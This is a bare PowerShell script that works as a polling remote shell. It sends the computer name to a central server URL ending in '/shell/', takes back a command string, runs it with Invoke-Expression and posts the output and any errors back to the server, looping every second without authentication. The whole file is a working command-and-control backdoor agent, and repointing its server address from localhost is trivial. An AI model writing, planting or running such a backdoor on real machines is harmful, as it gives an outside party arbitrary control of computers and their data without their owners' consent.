$centralServerUrl = "http://localhost/shell/"
Write-Output "Central server is now ready to execute commands...."
while ($true) {
    try {
        $whoami = $env:COMPUTERNAME
            $getCommand = @{
                'computerName' = $whoami
                'type' = 'ping'
            }
            $commandJSON = $getCommand | ConvertTo-Json
           $command =  Invoke-RestMethod -Uri $centralServerUrl -Method Post -Body $commandJSON -ContentType "application/json"
        if ($command) {
            $modifiedString = $command -replace "&#amp;", '"'
            $modifiedString = $modifiedString -replace "&quot;", '"'

            $result = Invoke-Expression -Command $modifiedString 2>&1 | Out-String
            $formattedOutput = $result -replace "`r`n|`n|`r", '<br>'
            $resultData = @{
                'response' = $formattedOutput
                'computerName' = $whoami
                'executedCommand' = $command
                'type' = 'response'
            }
            $resultJson = $resultData | ConvertTo-Json
            Invoke-RestMethod -Uri $centralServerUrl -Method Post -Body $resultJson -ContentType "application/json"
        }
        Start-Sleep -Seconds 1
    }
    catch {
        $errorMessage = $_.Exception.Message
        Write-Output "Error: $errorMessage"
        $errorData = @{
            'response' = $errorMessage
            'type' = 'error'
            'computerName' = $whoami
        }
        $errorJson = $errorData | ConvertTo-Json
        try {
            Invoke-RestMethod -Uri $centralServerUrl -Method Post -Body $errorJson -ContentType "application/json"
        }
        catch {
            Write-Output "Failed to send error to the central server: $_"
        }
        Start-Sleep -Seconds 1
    }
}